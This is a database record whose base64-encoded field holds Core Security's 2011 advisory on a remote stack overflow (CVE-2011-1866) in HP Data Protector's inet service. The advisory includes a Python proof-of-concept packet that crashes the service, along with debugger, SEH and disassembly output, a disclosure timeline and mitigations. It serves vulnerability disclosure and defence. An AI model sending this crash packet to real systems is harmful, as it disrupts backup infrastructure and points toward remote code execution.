{
    "source": "exploit-database", 
    "exploit": "LS0tLS1CRUdJTiBQR1AgU0lHTkVEIE1FU1NBR0UtLS0tLQ0KSGFzaDogU0hBMQ0KDQogIENvcmUgU2VjdXJpdHkgVGVjaG5vbG9naWVzIC0gQ29yZWxhYnMgQWR2aXNvcnkNCiAgICAgICBodHRwOi8vY29yZWxhYnMuY29yZXNlY3VyaXR5LmNvbS8NCg0KICBIUCBEYXRhIFByb3RlY3RvciBFWEVDX0NNRCBCdWZmZXIgT3ZlcmZsb3cgVnVsbmVyYWJpbGl0eQ0KDQoNCjEuICpBZHZpc29yeSBJbmZvcm1hdGlvbioNCg0KVGl0bGU6IEhQIERhdGEgUHJvdGVjdG9yIEVYRUNfQ01EIEJ1ZmZlciBPdmVyZmxvdyBWdWxuZXJhYmlsaXR5DQpBZHZpc29yeSBJRDogQ09SRS0yMDExLTA2MDYNCkFkdmlzb3J5IFVSTDoNCmh0dHA6Ly93d3cuY29yZXNlY3VyaXR5LmNvbS9jb250ZW50L0hQLURhdGEtUHJvdGVjdG9yLUVYRUNDTUQtVnVsbmVyYWJpbGl0eQ0KRGF0ZSBwdWJsaXNoZWQ6IDIwMTEtMDYtMjkNCkRhdGUgb2YgbGFzdCB1cGRhdGU6IDIwMTEtMDYtMjkNClZlbmRvcnMgY29udGFjdGVkOiBIUA0KUmVsZWFzZSBtb2RlOiBDb29yZGluYXRlZCByZWxlYXNlDQoNCg0KMi4gKlZ1bG5lcmFiaWxpdHkgSW5mb3JtYXRpb24qDQoNCkNsYXNzOiBSZW1vdGUgc3RhY2sgb3ZlcmZsb3cgW0NXRS0xMjBdDQpJbXBhY3Q6IENvZGUgZXhlY3V0aW9uDQpSZW1vdGVseSBFeHBsb2l0YWJsZTogWWVzDQpMb2NhbGx5IEV4cGxvaXRhYmxlOiBObw0KQ1ZFIE5hbWU6IENWRS0yMDExLTE4NjYNCg0KDQozLiAqVnVsbmVyYWJpbGl0eSBEZXNjcmlwdGlvbioNCg0KSFAgRGF0YSBQcm90ZWN0b3IgWzFdIGlzIGFuIGF1dG9tYXRlZCBiYWNrdXAgYW5kIHJlY292ZXJ5IHNvZnR3YXJlIGZvcg0Kc2luZ2xlLXNlcnZlciB0byBlbnRlcnByaXNlIGVudmlyb25tZW50cy4gQSB2dWxuZXJhYmlsaXR5IGluIEhQIERhdGENClByb3RlY3RvciBjb3VsZCBhbGxvdyBhIHJlbW90ZSBhdHRhY2tlciB0byBleGVjdXRlIGFyYml0cmFyeSBjb2RlLiBUaGUNCnZ1bG5lcmFiaWxpdHkgaXMgdHJpZ2dlcmVkIGJ5IHNlbmRpbmcgYSByZXF1ZXN0IHRvIHBvcnQgNTU1NSBvZiBhIGhvc3QNCnJ1bm5pbmcgdGhlICJkYXRhIHByb3RlY3RvciBpbmV0IiBzZXJ2aWNlLCBwYXJ0IG9mIEhQIERhdGEgUHJvdGVjdG9yLg0KDQoNCjQuICpWdWxuZXJhYmxlIHBhY2thZ2VzKg0KDQogICAuIEhQIE9wZW5WaWV3IFN0b3JhZ2UgRGF0YSBQcm90ZWN0b3IgdjYuMjAgKHJ1bm5pbmcgb24gV2luZG93cykuDQogICAuIEhQIE9wZW5WaWV3IFN0b3JhZ2UgRGF0YSBQcm90ZWN0b3IgdjYuMTEgKHJ1bm5pbmcgb24gV2luZG93cykuDQogICAuIEhQIE9wZW5WaWV3IFN0b3JhZ2UgRGF0YSBQcm90ZWN0b3IgdjYuMTAgKHJ1bm5pbmcgb24gV2luZG93cykuDQogICAuIEhQIE9wZW5WaWV3IFN0b3JhZ2UgRGF0YSBQcm90ZWN0b3IgdjYuMDAgKHJ1bm5pbmcgb24gV2luZG93cykuDQogICAuIFByZXZpb3VzIHZlcnNpb25zIG1heSBiZSBhZmZlY3RlZCwgYnV0IHdlcmUgbm90IHRlc3RlZC4NCg0KDQo1LiAqTm9uLXZ1bG5lcmFibGUgcGFja2FnZXMqDQoNCiAgIC4gTm8gZml4ZXMgYXJlIGF2YWlsYWJsZSBhdCB0aGUgdGltZSBvZiBwdWJsaWNhdGlvbi4NCg0KDQo2LiAqVmVuZG9yIEluZm9ybWF0aW9uLCBTb2x1dGlvbnMgYW5kIFdvcmthcm91bmRzKg0KDQpIUCBoYXMgaXNzdWVkIGEgc2VjdXJpdHkgYnVsbGV0aW4gd2l0aCBkb2N1bWVudCBJRCBjMDI4NzIxODIgWzJdDQphdmFpbGFibGUgdGhyb3VnaCBIUCBTdXBwb3J0IENlbnRlciBhdCBodHRwOi8vd3d3LmhwLmNvbS9nby9IUFNDLg0KDQpUaGUgbGF0ZXN0IHZlcnNpb24gb2YgSFAgRGF0YSBQcm90ZWN0b3IgaXMgdnVsbmVyYWJsZSB0byB0aGlzIGlzc3VlLiBIUA0KaGFzIHByb3ZpZGVkIHRoZSBmb2xsb3dpbmcgcHJvY2VkdXJlIHRvIG1pdGlnYXRlIHRoaXMgdnVsbmVyYWJpbGl0eToNCg0KICAgMS4gVXBncmFkZSB0byBEYXRhIFByb3RlY3RvciBBLjA2LjIwIG9yIHN1YnNlcXVlbnQuDQogICAyLiBFbmFibGUgZW5jcnlwdGVkIGNvbnRyb2wgY29tbXVuaWNhdGlvbiBzZXJ2aWNlcyBvbiBjZWxsIHNlcnZlciBhbmQNCmFsbCBjbGllbnRzIGluIGNlbGwuDQoNCiBUaGUgdXBncmFkZSBpcyBhdmFpbGFibGUgZm9yIGRvd25sb2FkIGZyb20NCmh0dHA6Ly9ocC5jb20vZ28vZGF0YXByb3RlY3RvciB0aGVuIHVuZGVyICdQcm9kdWN0IEluZm9ybWF0aW9uJyBjbGljayBvbg0KJ1RyaWFscyBhbmQgRGVtb3MnLg0KDQoNCjcuICpDcmVkaXRzKg0KDQpUaGlzIHZ1bG5lcmFiaWxpdHkgd2FzIGRpc2NvdmVyZWQgYW5kIHJlc2VhcmNoZWQgYnkgTmFodWVsIEMuIFJpdmEgZnJvbQ0KQ29yZSBTZWN1cml0eSBUZWNobm9sb2dpZXMuIFB1YmxpY2F0aW9uIHdhcyBjb29yZGluYXRlZCBieSBDYXJsb3MgU2FycmF1dGUuDQoNCg0KOC4gKlRlY2huaWNhbCBEZXNjcmlwdGlvbiAvIFByb29mIG9mIENvbmNlcHQgQ29kZSoNCg0KVGhlIGZvbGxvd2luZyBweXRob24gc2NyaXB0IGNhbiBiZSB1c2VkIHRvIHJlcHJvZHVjZSB0aGUgYnVnLg0KDQovLS0tLS0NCmltcG9ydCBzeXMNCmltcG9ydCBzb2NrZXQNCg0KZnJvbSBzdHJ1Y3QgaW1wb3J0IHBhY2sNCg0KaXAgPSBzeXMuYXJndlsxXQ0KcG9ydCA9IGludChzeXMuYXJndlsyXSkgIyBkZWZhdWx0IHRjcCBwb3J0IDU1NTUNCg0KdGFyZ2V0ID0gKGlwLCBwb3J0KQ0KDQpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0Kcy5jb25uZWN0KHRhcmdldCkNCg0KcGF0aCA9ICdBJyAqIDUwMDANCg0KcGFja2V0ID0gIHBhY2soJzxMJywgMHgyMDAwMzIyMCkNCnBhY2tldCArPSBwYWNrKCc8TCcsIDB4MDAzMDIwMDApDQpwYWNrZXQgKz0gJ1x4MjAnDQpwYWNrZXQgKz0gcGFjaygnPkgnLCAweDAwMjApDQpwYWNrZXQgKz0gcGFjaygnPEwnLCAweDAwNDMyMDAwKQ0KcGFja2V0ICs9IHBhY2soJzxMJywgMHgwMDMwMzIyMCkNCnBhY2tldCArPSAnXHgyMCcNCnBhY2tldCArPSAnb21uaWNoZWNrLmV4ZScNCnBhY2tldCArPSBwYWNrKCc+SCcsIDB4MDAyMCkNCnBhY2tldCArPSBwYWNrKCc+SCcsIDB4MDAyMCkgKiA0DQpwYWNrZXQgKz0gcGFjaygnPEwnLCAweDMwMjAwMDMwKQ0KcGFja2V0ICs9IHBhY2soJz5IJywgMHgwMDIwKQ0KcGFja2V0ICs9IHBhdGgNCnBhY2tldCArPSBwYWNrKCc+SCcsIDB4MDAwMCkNCg0KcGxlbiA9IHBhY2soJz5MJywgbGVuKHBhY2tldCkpDQoNCnMuc2VuZChwbGVuICsgcGFja2V0KQ0KDQotIC0tLS0tLw0KIEJ5IGV4ZWN1dGluZyB0aGlzIHNjcmlwdCwgdGhlIG9tbmlpbmV0LmV4ZSBwcm9jZXNzIGNyYXNoZXMgaW4gdGhlDQpmb2xsb3dpbmcgRUlQOg0KDQovLS0tLS0NCjdDODI4NUQzICAgIDhCMDQyNCAgICAgICAgICAgTU9WIEVBWCxEV09SRCBQVFIgU1M6W0VTUF0NCjdDODI4NUQ2ICAgIDhCRTUgICAgICAgICAgICAgTU9WIEVTUCxFQlANCjdDODI4NUQ4ICAgIDVEICAgICAgICAgICAgICAgUE9QIEVCUA0KN0M4Mjg1RDkgICAgQzMgICAgICAgICAgICAgICBSRVRODQogICAgICAgIA0KLSAtLS0tLS8NCiBUaGlzIGlzIHBhcnQgb2YgYSBmdW5jdGlvbiBpbnNpZGUgdGhlIG50ZGxsLmRsbCBsaWJyYXJ5LCBob3dldmVyLCBpZiB3ZQ0KbG9vayB0aGUgU0VIIGNoYWluLCB3ZSBjYW4gc2VlIHRoYXQgdGhlIFNFSCBoYW5kbGVyIHdhcyBvdmVyd3JpdHRlbiB3aXRoDQp0aGUgdmFsdWUgMHgwMDQxMDA0MSAodGhlIHVuaWNvZGUgdmFsdWUgZm9yICJBQSIpOg0KDQovLS0tLS0NClNFSCBjaGFpbiBvZiB0aHJlYWQgMDAwMDA1NzgNCkFkZHJlc3MgICAgU0UgaGFuZGxlcg0KMDA5QUZGOTQgICBvbW5paW5ldC4wMDQxMDA0MQ0KMDA0MTAwNDEgICBBMzAwNDQ3Mg0KICAgICAgICANCi0gLS0tLS0vDQogVGhlIGZvbGxvd2luZyBhcmUgdGhlIHZhbHVlcyBvZiB0aGUgQ1BVIHJlZ2lzdGVycyBhdCB0aGUgdGltZSBvZiB0aGUNCmNyYXNoOg0KDQovLS0tLS0NCkVBWCBDMDAwMDAwOA0KRUNYIDAwOUFFQzk4DQpFRFggN0M4Mjg1OUMgbnRkbGwuS2lSYWlzZVVzZXJFeGNlcHRpb25EaXNwYXRjaGVyDQpFQlggMDAxNUI0ODANCkVTUCAwMDlBRUM0NA0KRUJQIDAwOUFFQzk0DQpFU0kgMDAxNTVBODANCkVESSAwMDAwMDAwMA0KRUlQIDdDODI4NUQzIG50ZGxsLjdDODI4NUQzDQpDIDAgIEVTIDAwMjMgMzJiaXQgMChGRkZGRkZGRikNClAgMSAgQ1MgMDAxQiAzMmJpdCAwKEZGRkZGRkZGKQ0KQSAwICBTUyAwMDIzIDMyYml0IDAoRkZGRkZGRkYpDQpaIDAgIERTIDAwMjMgMzJiaXQgMChGRkZGRkZGRikNClMgMCAgRlMgMDAzQiAzMmJpdCA3RkZEQjAwMChGRkYpDQpUIDAgIEdTIDAwMDAgTlVMTA0KRCAwDQpPIDAgIExhc3RFcnIgRVJST1JfU1VDQ0VTUyAoMDAwMDAwMDApDQpFRkwgMDAwMDAyMDYgKE5PLE5CLE5FLEEsTlMsUEUsR0UsRykNClNUMCBlbXB0eSAwLjANClNUMSBlbXB0eSAwLjANClNUMiBlbXB0eSAwLjANClNUMyBlbXB0eSAwLjANClNUNCBlbXB0eSAwLjANClNUNSBlbXB0eSAwLjANClNUNiBlbXB0eSAwLjc2MTAwMDAwMDAwMDAwMDAwOTgNClNUNyBlbXB0eSAxLjAwMDAwMDAwMDAwMDAwMDAwMDANCiAgICAgICAgICAgICAgIDMgMiAxIDAgICAgICBFIFMgUCBVIE8gWiBEIEkNCkZTVCA0MDIwICBDb25kIDEgMCAwIDAgIEVyciAwIDAgMSAwIDAgMCAwIDAgIChFUSkNCkZDVyAwMjdGICBQcmVjIE5FQVIsNTMgIE1hc2sgICAgMSAxIDEgMSAxIDENCiAgICAgICAgDQotIC0tLS0tLw0KIFRoZSBwcm9ibGVtIGlzIGluIHRoZSAwMDQxRDE3MCBmdW5jdGlvbi4gVGhpcyBmdW5jdGlvbiBkb2VzIGEgYmxpbmQNCmNvcHkgb2YgdGhlIHN0cmluZyBwYXNzZWQgaW4gdGhlIHBhY2tldCBhcyBhIHBhdGg6DQoNCi8tLS0tLQ0KMDA0MUQxNzAgICAgIC8kIDU1ICAgICAgICAgICAgIFBVU0ggRUJQDQowMDQxRDE3MSAgICAgfC4gOEJFQyAgICAgICAgICAgTU9WIEVCUCxFU1ANCjAwNDFEMTczICAgICB8LiA1MSAgICAgICAgICAgICBQVVNIIEVDWA0KMDA0MUQxNzQgICAgIHwuIDhCNDUgMDggICAgICAgIE1PViBFQVgsRFdPUkQgUFRSIFNTOltFQlArOF0NCjAwNDFEMTc3ICAgICB8LiA4OTQ1IEZDICAgICAgICBNT1YgRFdPUkQgUFRSIFNTOltFQlAtNF0sRUFYDQowMDQxRDE3QSAgICAgfC4gOEI0RCAwOCAgICAgICAgTU9WIEVDWCxEV09SRCBQVFIgU1M6W0VCUCs4XQ0KMDA0MUQxN0QgICAgIHwuIDBGQjcxMSAgICAgICAgIE1PVlpYIEVEWCxXT1JEIFBUUiBEUzpbRUNYXQ0KMDA0MUQxODAgICAgIHwuIDg1RDIgICAgICAgICAgIFRFU1QgRURYLEVEWA0KMDA0MUQxODIgICAgIHwuIDc0IDczICAgICAgICAgIEpFIFNIT1JUIG9tbmlpbmV0LjAwNDFEMUY3DQpbLi4uXQ0KMDA0MUQxRjcgICAgIHw+IDhCNDUgMEMgICAgICAgIC9NT1YgRUFYLERXT1JEIFBUUiBTUzpbRUJQK0NdDQowMDQxRDFGQSAgICAgfC4gMEZCNzA4ICAgICAgICAgfE1PVlpYIEVDWCxXT1JEIFBUUiBEUzpbRUFYXQ0KMDA0MUQxRkQgICAgIHwuIDg1QzkgICAgICAgICAgIHxURVNUIEVDWCxFQ1gNCjAwNDFEMUZGICAgICB8LiA3NCAyNiAgICAgICAgICB8SkUgU0hPUlQgb21uaWluZXQuMDA0MUQyMjcNCjAwNDFEMjAxICAgICB8LiA4QjU1IDA4ICAgICAgICB8TU9WIEVEWCxEV09SRCBQVFIgU1M6W0VCUCs4XQ0KMDA0MUQyMDQgICAgIHwuIDg5NTUgRkMgICAgICAgIHxNT1YgRFdPUkQgUFRSIFNTOltFQlAtNF0sRURYDQowMDQxRDIwNyAgICAgfC4gOEI0NSAwOCAgICAgICAgfE1PViBFQVgsRFdPUkQgUFRSIFNTOltFQlArOF0NCjAwNDFEMjBBICAgICB8LiA4QjREIDBDICAgICAgICB8TU9WIEVDWCxEV09SRCBQVFIgU1M6W0VCUCtDXQ0KMDA0MUQyMEQgICAgIHwuIDY2OjhCMTEgICAgICAgIHxNT1YgRFgsV09SRCBQVFIgRFM6W0VDWF0NCjAwNDFEMjEwICAgICB8LiA2Njo4OTEwICAgICAgICB8TU9WIFdPUkQgUFRSIERTOltFQVhdLERYIC8vIGNvcHkgV09SRHMNCnRvIHRoZSBzdGFjaw0KMDA0MUQyMTMgICAgIHwuIDhCNDUgMDggICAgICAgIHxNT1YgRUFYLERXT1JEIFBUUiBTUzpbRUJQKzhdDQowMDQxRDIxNiAgICAgfC4gODNDMCAwMiAgICAgICAgfEFERCBFQVgsMg0KMDA0MUQyMTkgICAgIHwuIDg5NDUgMDggICAgICAgIHxNT1YgRFdPUkQgUFRSIFNTOltFQlArOF0sRUFYDQowMDQxRDIxQyAgICAgfC4gOEI0RCAwQyAgICAgICAgfE1PViBFQ1gsRFdPUkQgUFRSIFNTOltFQlArQ10NCjAwNDFEMjFGICAgICB8LiA4M0MxIDAyICAgICAgICB8QUREIEVDWCwyDQowMDQxRDIyMiAgICAgfC4gODk0RCAwQyAgICAgICAgfE1PViBEV09SRCBQVFIgU1M6W0VCUCtDXSxFQ1gNCjAwNDFEMjI1ICAgICB8Ll5FQiBEMCAgICAgICAgICBcSk1QIFNIT1JUIG9tbmlpbmV0LjAwNDFEMUY3DQowMDQxRDIyNyAgICAgfD4gOEI1NSAwOCAgICAgICAgTU9WIEVEWCxEV09SRCBQVFIgU1M6W0VCUCs4XQ0KMDA0MUQyMkEgICAgIHwuIDY2OkM3MDIgMDAwMCAgIE1PViBXT1JEIFBUUiBEUzpbRURYXSwwDQowMDQxRDIyRiAgICAgfC4gOEI0NSBGQyAgICAgICAgTU9WIEVBWCxEV09SRCBQVFIgU1M6W0VCUC00XQ0KMDA0MUQyMzIgICAgIHwuIDhCRTUgICAgICAgICAgIE1PViBFU1AsRUJQDQowMDQxRDIzNCAgICAgfC4gNUQgICAgICAgICAgICAgUE9QIEVCUA0KMDA0MUQyMzUgICAgIFwuIEMzICAgICAgICAgICAgIFJFVE4NCiAgICAgICAgDQotIC0tLS0tLw0KDQoNCg0KOS4gKlJlcG9ydCBUaW1lbGluZSoNCg0KLiAyMDExLTA2LTA2Og0KQ29yZSBTZWN1cml0eSBUZWNobm9sb2dpZXMgbm90aWZpZXMgdGhlIEhQIHRlYW0gb2YgdGhlIHZ1bG5lcmFiaWxpdGllcw0KYW5kIHByb3ZpZGVzIHRoZSB0ZWNobmljYWwgZGV0YWlscy4gUHVibGljYXRpb24gZGF0ZSBpcyB0ZW1wb3JhcmlseSBzZXQNCnRvIEp1bHkgNXRoLCAyMDExLg0KDQouIDIwMTEtMDYtMDY6DQpWZW5kb3IgY29uZmlybXMgdGhhdCBhIG5ldyBjYXNlIHdhcyBhc3NpZ25lZCB3aXRoaW4gSFAgU29mdHdhcmUgU2VjdXJpdHkNClJlc3BvbnNlIFRlYW0gKFNTUlQpLg0KDQouIDIwMTEtMDYtMTY6DQpDb3JlIHJlcXVlc3RzIGFuIHVwZGF0ZSBvbiB0aGlzIGlzc3VlLCBpbiBwYXJ0aWN1bGFyIENvcmUgYXNrcyB0aGUNCnZlbmRvciBmb3IgYSB0ZWNobmljYWwgYW5hbHlzaXMgb2YgdGhlIGJ1Z3MsIGEgbGlzdCBvZiBhZmZlY3RlZCBwcm9kdWN0cw0KYW5kIHZlcnNpb25zLCBhbmQgdGhlIHZlbmRvcidzIHBsYW4gZm9yIHByb3ZpZGluZyBhIGZpeCAobm8gcmVwbHkNCnJlY2VpdmVkKS4NCg0KLiAyMDExLTA2LTIzOg0KQ29yZSByZXF1ZXN0cyBvbmNlIG1vcmUgYW4gdXBkYXRlLg0KDQouIDIwMTEtMDYtMjg6DQpWZW5kb3IgY29tbXVuaWNhdGVzIHRoYXQgYSBzZWN1cml0eSBidWxsZXRpbiB3aWxsIGJlIGlzc3VlZCBvbiB0aGUgc2FtZQ0KZGF5IChKdW5lIDI4KS4gVGhlIHZlbmRvciBjb25maXJtcyB0aGUgdnVsbmVyYWJpbGl0aWVzLCBhbmQgcmVjb21tZW5kcw0KYXMgbWl0aWdhdGlvbiB0byBlbmFibGUgZW5jcnlwdGVkIGNvbW11bmljYXRpb25zIGluIHRoZSBjZWxsIHNlcnZlciBhbmQNCmNsaWVudC4NCg0KLiAyMDExLTA2LTI4Og0KQ29yZSByZXF1ZXN0cyBhIGxpbmsgdG8gdGhlIHZlbmRvcidzIGJ1bGxldGluLCBhbmQgYXNrcyB3aGV0aGVyIENWRSBpZHMNCmhhdmUgYmVlbiBhc3NpZ25lZC4NCg0KLiAyMDExLTA2LTI4Og0KVmVuZG9yIHByb3ZpZGVzIGEgbGluayB0byB0aGUgYnVsbGV0aW4gYW5kIENWRSBuYW1lcyBmb3IgdGhlDQp2dWxuZXJhYmlsaXRpZXMuDQoNCi4gMjAxMS0wNi0yOToNCkFkdmlzb3J5IENPUkUtMjAxMS0wNjA2IGlzIHB1Ymxpc2hlZC4NCg0KDQoNCjEwLiAqUmVmZXJlbmNlcyoNCg0KWzFdIEhQIERhdGEgUHJvdGVjdG9yIGh0dHA6Ly9ocC5jb20vZ28vZGF0YXByb3RlY3Rvcg0KWzJdIEhQU0JNVTAyNjg2IFNTUlQxMDA1NDEgcmV2LjIgLSBIUCBPcGVuVmlldyBTdG9yYWdlIERhdGEgUHJvdGVjdG9yLA0KUmVtb3RlIEV4ZWN1dGlvbiBvZiBBcmJpdHJhcnkgQ29kZQ0KaHR0cDovL2gyMDAwMC53d3cyLmhwLmNvbS9iaXpzdXBwb3J0L1RlY2hTdXBwb3J0L0RvY3VtZW50LmpzcD9vYmplY3RJRD1jMDI4NzIxODINCg0KDQoxMS4gKkFib3V0IENvcmVMYWJzKg0KDQpDb3JlTGFicywgdGhlIHJlc2VhcmNoIGNlbnRlciBvZiBDb3JlIFNlY3VyaXR5IFRlY2hub2xvZ2llcywgaXMgY2hhcmdlZA0Kd2l0aCBhbnRpY2lwYXRpbmcgdGhlIGZ1dHVyZSBuZWVkcyBhbmQgcmVxdWlyZW1lbnRzIGZvciBpbmZvcm1hdGlvbg0Kc2VjdXJpdHkgdGVjaG5vbG9naWVzLiBXZSBjb25kdWN0IG91ciByZXNlYXJjaCBpbiBzZXZlcmFsIGltcG9ydGFudA0KYXJlYXMgb2YgY29tcHV0ZXIgc2VjdXJpdHkgaW5jbHVkaW5nIHN5c3RlbSB2dWxuZXJhYmlsaXRpZXMsIGN5YmVyDQphdHRhY2sgcGxhbm5pbmcgYW5kIHNpbXVsYXRpb24sIHNvdXJjZSBjb2RlIGF1ZGl0aW5nLCBhbmQgY3J5cHRvZ3JhcGh5Lg0KT3VyIHJlc3VsdHMgaW5jbHVkZSBwcm9ibGVtIGZvcm1hbGl6YXRpb24sIGlkZW50aWZpY2F0aW9uIG9mDQp2dWxuZXJhYmlsaXRpZXMsIG5vdmVsIHNvbHV0aW9ucyBhbmQgcHJvdG90eXBlcyBmb3IgbmV3IHRlY2hub2xvZ2llcy4NCkNvcmVMYWJzIHJlZ3VsYXJseSBwdWJsaXNoZXMgc2VjdXJpdHkgYWR2aXNvcmllcywgdGVjaG5pY2FsIHBhcGVycywNCnByb2plY3QgaW5mb3JtYXRpb24gYW5kIHNoYXJlZCBzb2Z0d2FyZSB0b29scyBmb3IgcHVibGljIHVzZSBhdDoNCmh0dHA6Ly9jb3JlbGFicy5jb3Jlc2VjdXJpdHkuY29tLg0KDQoNCjEyLiAqQWJvdXQgQ29yZSBTZWN1cml0eSBUZWNobm9sb2dpZXMqDQoNCkNvcmUgU2VjdXJpdHkgVGVjaG5vbG9naWVzIGVuYWJsZXMgb3JnYW5pemF0aW9ucyB0byBnZXQgYWhlYWQgb2YgdGhyZWF0cw0Kd2l0aCBzZWN1cml0eSB0ZXN0IGFuZCBtZWFzdXJlbWVudCBzb2x1dGlvbnMgdGhhdCBjb250aW51b3VzbHkgaWRlbnRpZnkNCmFuZCBkZW1vbnN0cmF0ZSByZWFsLXdvcmxkIGV4cG9zdXJlcyB0byB0aGVpciBtb3N0IGNyaXRpY2FsIGFzc2V0cy4gT3VyDQpjdXN0b21lcnMgY2FuIGdhaW4gcmVhbCB2aXNpYmlsaXR5IGludG8gdGhlaXIgc2VjdXJpdHkgc3RhbmRpbmcsIHJlYWwNCnZhbGlkYXRpb24gb2YgdGhlaXIgc2VjdXJpdHkgY29udHJvbHMsIGFuZCByZWFsIG1ldHJpY3MgdG8gbW9yZQ0KZWZmZWN0aXZlbHkgc2VjdXJlIHRoZWlyIG9yZ2FuaXphdGlvbnMuDQoNCkNvcmUgU2VjdXJpdHkncyBzb2Z0d2FyZSBzb2x1dGlvbnMgYnVpbGQgb24gb3ZlciBhIGRlY2FkZSBvZiB0cnVzdGVkDQpyZXNlYXJjaCBhbmQgbGVhZGluZy1lZGdlIHRocmVhdCBleHBlcnRpc2UgZnJvbSB0aGUgY29tcGFueSdzIFNlY3VyaXR5DQpDb25zdWx0aW5nIFNlcnZpY2VzLCBDb3JlTGFicyBhbmQgRW5naW5lZXJpbmcgZ3JvdXBzLiBDb3JlIFNlY3VyaXR5DQpUZWNobm9sb2dpZXMgY2FuIGJlIHJlYWNoZWQgYXQgKzEgKDYxNykgMzk5LTY5ODAgb3Igb24gdGhlIFdlYiBhdDoNCmh0dHA6Ly93d3cuY29yZXNlY3VyaXR5LmNvbS4NCg0KDQoxMy4gKkRpc2NsYWltZXIqDQoNClRoZSBjb250ZW50cyBvZiB0aGlzIGFkdmlzb3J5IGFyZSBjb3B5cmlnaHQgKGMpIDIwMTEgQ29yZSBTZWN1cml0eQ0KVGVjaG5vbG9naWVzIGFuZCAoYykgMjAxMSBDb3JlTGFicywgYW5kIGFyZSBsaWNlbnNlZCB1bmRlciBhIENyZWF0aXZlDQpDb21tb25zIEF0dHJpYnV0aW9uIE5vbi1Db21tZXJjaWFsIFNoYXJlLUFsaWtlIDMuMCAoVW5pdGVkIFN0YXRlcykNCkxpY2Vuc2U6IGh0dHA6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzMuMC91cy8NCg0KDQoxNC4gKlBHUC9HUEcgS2V5cyoNCg0KVGhpcyBhZHZpc29yeSBoYXMgYmVlbiBzaWduZWQgd2l0aCB0aGUgR1BHIGtleSBvZiBDb3JlIFNlY3VyaXR5DQpUZWNobm9sb2dpZXMgYWR2aXNvcmllcyB0ZWFtLCB3aGljaCBpcyBhdmFpbGFibGUgZm9yIGRvd25sb2FkIGF0DQpodHRwOi8vd3d3LmNvcmVzZWN1cml0eS5jb20vZmlsZXMvYXR0YWNobWVudHMvY29yZV9zZWN1cml0eV9hZHZpc29yaWVzLmFzYy4NCi0tLS0tQkVHSU4gUEdQIFNJR05BVFVSRS0tLS0tDQpWZXJzaW9uOiBHbnVQRyB2MS40LjkgKE1pbmdXMzIpDQoNCmlFWUVBUkVDQUFZRkFrNExuWnNBQ2drUXlOaWJnZ2l0V2EwNy9BQ2ZTbHprQnZib3dBc2tlUC9LNEZxdHhDYXkNCkVBa0FuUkNQS2RjMzV0NUNiMFpKYkd5NG1lNEpSQUxvDQo9ekhvbg0KLS0tLS1FTkQgUEdQIFNJR05BVFVSRS0tLS0t", 
    "filename": "platforms/windows/dos/17461.txt", 
    "id": "17461", 
    "cves": [
        "CVE-2011-1866"
    ]
}